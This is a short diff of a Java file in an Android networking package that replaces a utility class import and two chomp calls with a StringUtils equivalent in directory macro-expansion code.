@@ -14,7 +14,7 @@ import java.util.Enumeration;
 import com.android.networking.Messages;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
-import com.android.networking.util.Utils;
+import com.android.networking.util.StringUtils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -43,7 +43,7 @@ public class Directory {
 
 			// final String first = filter.substring(0, macro);
 			final String end = filename.substring(macro + expand.length(), filename.length());
-			expandedFilter = Utils.chomp(newdir, "/") + end; //$NON-NLS-1$
+			expandedFilter = StringUtils.chomp(newdir, "/") + end; //$NON-NLS-1$
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (expandMacro) expandedFilter: " + expandedFilter);
@@ -72,7 +72,7 @@ public class Directory {
 			Check.log(TAG + " expanding macro");
 		}
 
-		expandedFilter = filename.replaceFirst("\\$dir\\$", Utils.chomp(Path.hidden(), "/"));
+		expandedFilter = filename.replaceFirst("\\$dir\\$", StringUtils.chomp(Path.hidden(), "/"));
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " expandedFilter: " + expandedFilter);
